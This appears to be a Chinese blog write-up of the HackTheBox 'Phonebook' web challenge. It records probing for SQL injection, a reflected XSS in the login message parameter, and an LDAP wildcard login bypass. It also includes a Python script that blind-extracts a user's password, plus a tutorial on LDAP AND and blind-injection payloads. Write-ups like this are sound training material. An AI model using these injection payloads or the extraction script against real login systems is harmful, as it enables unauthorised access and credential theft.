---
layout: post
title: HTB-Easy-Phonebook
excerpt: "第四道HTB题目,解题过程"
date:   2021-05-11 20:45:00
categories: [HackTheBox]
comments: true
---

## 解题步骤

1. 题目描述：Who is lucky enough to be included in the phonebook?

2. 访问网站，应该是需要登陆，可能是SQL注入漏洞

   ![image-20210511205205341](https://monkeydatabase.github.io/img/image-20210511205205341.png)

3. 随便输入账号密码，进行抓包

   * request，获取登陆页面

     ```http
     GET /login HTTP/1.1
     Host: 206.189.121.131:32453
     User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.
     Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
     Accept-Language: en-US,en;q=0.5
     Accept-Encoding: gzip, deflate
     Connection: close
     Upgrade-Insecure-Requests: 1
     ```

   * request，填写用户名密码点击登录

     ```http
     POST /login HTTP/1.1
     
     Host: 206.189.121.131:32453
     User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
     Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
     Accept-Language: en-US,en;q=0.5
     Accept-Encoding: gzip, deflate
     Referer: http://206.189.121.131:32453/login
     Content-Type: application/x-www-form-urlencoded
     Content-Length: 26
     Connection: close
     Upgrade-Insecure-Requests: 1
     
     username=root&password=123
     ```

   * response，服务器返回的内容

     ```http
     HTTP/1.1 302 Found
     Location: /login?message=Authentication%20failed
     Date: Tue, 11 May 2021 12:55:14 GMT
     Content-Length: 0
     Connection: close
     ```

   * 可以看出主要流程是通过post将明文的用户名和密码传输给服务端，当不合法时进行客户端重定向并通过一个get参数message用前端的js读取该字段弹窗提醒用户认证失败

4. 输入`'`进行验证，发现无法完成注入，正常返回登陆失败

5. 发现只要在输入框中输入`)`，网页就会崩溃，显示网页无法正常运作，猜测可能后端在收到括号时进行了字符串替换

6. 输入`) or 1=1`，发现仍然报错

7. 在检查html代码时，发现电话图片的资源地址比较特殊，路径是一个特别长的串

   ```html
   <img class="mb-4" src="/964430b4cdd199af19b986eaf2193b21f32542d0/phone-icon.png" alt="" width="72" height="72">
   ```

8. 访问http://ip:port/964430b4cdd199af19b986eaf2193b21f32542d0/，竟然能够访问

   ![image-20210511223134751](https://monkeydatabase.github.io/img/image-20210511223134751.png)

9. 查看源码

   ```javascript
   function failure() {
       var content = '<p class="lead">No search results.</p>';
       $('#maindiv').append(content);
   };
   
   function success(data) {
       $("#maindiv").empty();
   
       if (data.length == 0) {
           failure();
           return;
       };
   
       var content = "<table>";
       data.forEach(function(item) {
           content += '<tr><td>' + item["cn"] + " " + item["sn"] + '</td><td>'+ item["mail"]  +'</td><td>'+ item["homePhone"] +'</td></tr>';
           console.log(item);
       });
       content += "</table>";
       $('#maindiv').append(content);
   };
   
   function search(form) {
       var searchObject = new Object();
       searchObject.term = 'Reese';
       $.ajax({
           type: "POST",
           url: "/search",
           data: JSON.stringify(searchObject),
           success: success,
           dataType: "json",
       });
   };
   ```

   * 在通信成功时，将response数据的cn、sn、mail、homePhone展示在id为maindiv的标签下，并将每个数据项打印在console上

   * 请求通过post请求访问/search进行查询，request body是将查询的值序列化为json

   * 抓包进行验证

     ```http
     POST /search HTTP/1.1
     Host: 178.62.93.178:32449
     User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
     Accept: application/json, text/javascript, */*; q=0.01
     Accept-Language: en-US,en;q=0.5
     Accept-Encoding: gzip, deflate
     Referer: http://178.62.93.178:32449/964430b4cdd199af19b986eaf2193b21f32542d0/
     Content-Type: application/x-www-form-urlencoded; charset=UTF-8
     X-Requested-With: XMLHttpRequest
     Content-Length: 14
     Connection: close
     
     {"term":"123"}
     ```

   * 但是response有点问题，应该是没有登陆拿到Cookie的原因吧

     ```http
     HTTP/1.1 403 Forbidden
     Content-Type: text/plain; charset=utf-8
     Date: Wed, 12 May 2021 01:13:04 GMT
     Content-Length: 13
     Connection: close
     
     Access denied
     ```

10. 重新回到登陆页面，发现有一段提示看不懂

    ```TEX
    New (9.8.2020): You can now login using the workstation username and password! - Reese
    ```

    * 什么叫workstation username？
    * 拿不到这个就没办法登录

11. 登陆页面存在一个xss漏洞

    ```javascript
    const queryString = window.location.search;
    if (queryString) {
      const urlParams = new URLSearchParams(queryString);
      const message = urlParams.get('message');
      if (message) {
        document.getElementById("message").innerHTML = message;
        document.getElementById("message").style.visibility = "visible";
        }
      }
    ```

    * 将所有Get参数赋值给queryString

    * 如果不为空，就将其中的message参数放入网页代码中

    * 验证xss漏洞，构造请求http://ip:port/login?message=\<img src=%22https://www.baidu.com/img/flexible/logo/pc/result.png/\>

      ![image-20210512092925155](https://monkeydatabase.github.io/img/image-20210512092925155.png)

    * 但是这个xss漏洞并不能上传，只能在本地运行

12. 对路径进行访问发现

    ```shell
    # Phonebook页面 即后来发现的页面
    http://ip:port/964430b4cdd199af19b986eaf2193b21f32542d0/index.html
    # Login页面 即一开始看到的页面
    http://ip:port/964430b4cdd199af19b986eaf2193b21f32542d0/login.html
    ```

13. 因此不得不绕过登录

    * 使用`)`网站后端会报错，可能是将`)`替换为了`'`

    * 使用`) or 1=1 #`，仍然报错，如果按照替换的思路，首先`#`被替换为了其它字符，使用Burp Suite进行爆破尝试

      * Python生成爆破字典

        ```python
        import time
        import os
        
        # 33 127是可打印字符
        
        if __name__ == '__main__':
            filename = './Output/{}.txt'.format(time.strftime('%Y-%m-%d %H-%M-%S',time.localtime(time.time())))
            startNum, endNum = map(int, input("请输入起始值和结束值：").split())
            with open(filename, 'a') as file_object:
                print("开始输出")
                tempNum = startNum
                if tempNum < endNum:
                    while tempNum <= endNum:
                        file_object.write(") or 1=1 {}\n".format(chr(tempNum)))
                        tempNum = tempNum+1
                else:
                    while tempNum > endNum:
                        file_object.write("{}\n".format(chr(tempNum)))
                        tempNum = tempNum+1
            print("已输出到{}{}".format(os.path.abspath('.'), filename))
        ```

      * Burp Suite爆破，发现使用`%`时不报错，但是仍然认证失败，因此可能是等号也被转义了

        ![image-20210512101721444](https://monkeydatabase.github.io/img/image-20210512101721444.png)

      * 未找到解决方案，但是也有可能是`)`被转义成了`#`，那么什么能被转义成`'`呢?在简单的尝试之后发现`\`也可以引起网页崩溃

      * 统计一下字符

        * 失效的字符：`#`、`--`、`'`
        * 能引起崩溃的字符：`)`、`\`

      * 猜测sql： select * from user where username='$\_POST["username"]' and password='$\_POST["password"]'

      * 因为提示给出了一个用户名Reese，因此需要想办法登录该账号，select * from user where username='Reese' and password='123)'

      * 验证`)`的功能

        * select * from user where username='Reese).' and password='123'，页面崩溃，说明`)`并不是转义符的功能
        * 所以`)`可能是注释符、单引号

      * 验证`\`的功能

        * select * from user where username='Reese\\.' and password='123'，网页崩溃，说明`\`目前并不是转义符的功能
        * 所以`\`可能是注释符、单引号

      * 当`\`是注释符、`)`是单引号时，select * from user where username='Reese)/\*\*/||/\*\*/ 2>1\\' and password='123'，页面崩溃，因此不可能

      * 当`\`是单引号、`)`是注释符时，select * from user where username='Reese\/\*\*/||/\*\*/ 2>1\)' and password='123'，页面崩溃，因此不可能

14. 检查是否有其它可能影响SQL的符号，发现只有`)`、`\`两个

    ![image-20210512143248781](https://monkeydatabase.github.io/img/image-20210512143248781.png)

15. 继续尝试注入

    * 猜测SQL为：select id from user where username='$\_POST["username"]' and password='$\_POST["password"]'
    * 可能只需要拿到用户名为Reese的id，那么就不需要使用`or 1=1 #`，只需要将其注入为select id from user where username='Reese'#' and password='$\_POST["password"]'
    * 但是不知道`\`和`)`是怎么搞的
    
16. 转换思路，它可能后端不是用的数据库，而是LDAP，LDAP中最敏感的字符就是括号，本题中又恰好过滤了SQL语句中不重要的右括号，而且`/search`页面展示的列表内容包括的cn、sn、mail、homePhone四项中有两项是LDAP的关键字，尝试LDAP注入

    * 一旦LDAP注入成功，就可以通过AND盲注获取用户的密码
    * 想要尝试LDAP注入，首先要知道如何能绕过右括号的过滤
    * 尝试用十六进制的`)`，但是`\x29`中有`\`，导致系统崩溃
    
17. 过了十天后，发现完全不用`)`、`\`去绕过，因为LDAP使用`*`号就是通配符，它既然检索语句应该是`(&(username=$_POST[username])(password=$_POST[password]))`，直接将输入的用户名和密码输入为通配符就能登陆，对于这道题完全是想得太多了，Overthinking is nothing！

18. 由于login界面有一个公告，上面有了一个用户名`Reese`，因此先尝试爆破它的密码

    * exploit

      ```python
      import requests
      import numpy as np
      
      URL = 'http://159.65.95.35:30252/login'
      URL_ENCODED_BODY_FORMAT = 'username={}&password={}'
      USERNAME = 'Reese'
      PASSWORD_TO_INTRUDE = ''
      header = {"Content-Type": "application/x-www-form-urlencoded"}
      RIGHTLOCATION = '/'
      BLACKLIST = ['*', ')', '\\']
      
      
      def build_post_body_url_encoded(username, password)->str:
          return URL_ENCODED_BODY_FORMAT.format(username, password)
      
      
      def send():
          for i in np.arange(32, 128):
              if chr(i) in BLACKLIST:
                  continue
              global PASSWORD_TO_INTRUDE
              password_temp = PASSWORD_TO_INTRUDE + chr(i) + '%2a'
              data = build_post_body_url_encoded(USERNAME, password_temp)
              resp = requests.post(url=URL, data=data, headers=header, allow_redirects=False)
              if resp.headers.get('Location') == RIGHTLOCATION:
                  PASSWORD_TO_INTRUDE = password_temp.replace('%2a', '')
                  return True
      
      while send():
          print(PASSWORD_TO_INTRUDE)
      ```

    * 运算结果

      ```tex
      HTB{d1rectory_h4xx0r_is_k00l}
      ```

19. 提交，答案正确



## 独立思考

### 1、Referrer Policy字段有什么作用？

* HTTP Request结构
  * 请求行
  * 请求头
    * General
    * Request Headers
  * 请求体
* Referrer Policy存在于请求头的General中用来约束Request Headers中的Referer
* Referer Policy属性值
  * no-referer：任何情况都不发送referer
  * no-referer-when-downgrade：当发生协议降级时不发送Referer，如HTTPS页面加载HTTP资源、HTTPS页面跳转到HTTP页面
  * origin only：发送只包含"协议+HOST"部分的Referer，无论是否跨域、是否降级，都发送Referer，只不过只包含协议及HOST，不包含子路径及GET参数
  * origin when cross origin：仅在发生跨域时发送只包含"协议+HOST"的Referer，同域下发送完整Referer。当Protocol、Host、Port均一致时才会认为同域
  * unsafe url：无论是否跨域、是否降级，都发送完整Referer信息

### 2、LDAP注入漏洞是什么？有什么利用价值？

* LDAP(Lightweight Directory Access Protocol)轻量级目录访问协议，是一种在线目录访问协议，主要对目录中的资源进行搜索和查询

* LDAP存储

  * LDAP数据库是树形结构的，树中的每个节点是一个条目
  * Entry：目录中存储的基本信息单元，每个Entry有若干属性和若干的值，Entry内部还可以包含Entry
  * ObjectClass：对象类封装了可选/必选属性，同时对象类也是支持继承的。一个Entry必须包含一个objectClass且需要赋予至少一个值
  * Attribute：封装在objectClass中，用来存储字段值

* LDAP常见关键字

  * dc：Domain Component
  * uid：User Id，一条记录的ID
  * ou：Organization Unit，组织单位
  * cn：Common Name，公共名称
  * sn：Surname，姓
  * dn：Distinguished Name，记录的位置
  * rdn：Relative dn，相对路径

* LDAP语法

  * =

    ```sql
    # 查找username属性为admin的所有条目
    (username=admin)
    ```

  * &

    ```sql
    (&(username=admin)(password=23333))
    ```

  * |

    ```sql
    (|(username=admin)(username=hacker))
    ```

  * *

    ```SQL
    (password=*)
    ```

  * 高级语法

    ```sql
    (&(devicestatus=available)(|(devicetype=printer)(devicetype=scanner)))
    ```

* LDAP注入

  LDAP注入类似于SQL注入，当用户输入的参数没有得到合适的过滤时，攻击者可以诸如恶意代码。其中一个重要的特性是openLDAP中假如有多个过滤器，那么它依旧会从左到右执行，只有第一个过滤器会生效，忽略掉第一个过滤器闭合后的任何字符

  * AND注入

    * 正常输入

      ```sql
      (&(username=admin)(password=23333))
      ```

    * 恶意输入，username=admin)(*)

      ```sql
      (&(username=admin)(*))(password=23333))
      ```

  * AND盲注

    * 正常注入

      ```sql
      (&(username=admin)(password=23333))
      ```

    * 恶意注入，username=admin)(password=a*)

      ```sql
      (&(username=admin)(password=a*))(password=23333))
      ```

    * 从而依次判断每一位的值

* 小技巧

  * %00：注释掉后面的代码

### 3、本题有哪些值得学习的点？

* 首先是不要想太多，要首先尝试用最简单的思路去解题，不要上来就想一堆花招。
* 对于注入的题目，首先想到的是最正常的方式去解题，然后再尝试在不改变后端SQL语句结构的情况下注入，最后再尝试堆叠注入、联合注入、报错注入、布尔注入、盲注等复杂手法，在这些都无法注入的情况下再尝试大小写绕过、编码绕过、括号分隔符、内联注入等绕过技巧，在这些都无法绕过的时候，再去思考后端对特殊字符的处理是ban还是replace。

## 产生过的疑问

1. Referrer Policy字段有什么作用？
2. LDAP注入漏洞是什么？有什么利用价值？
3. 本题有哪些值得学习的点？

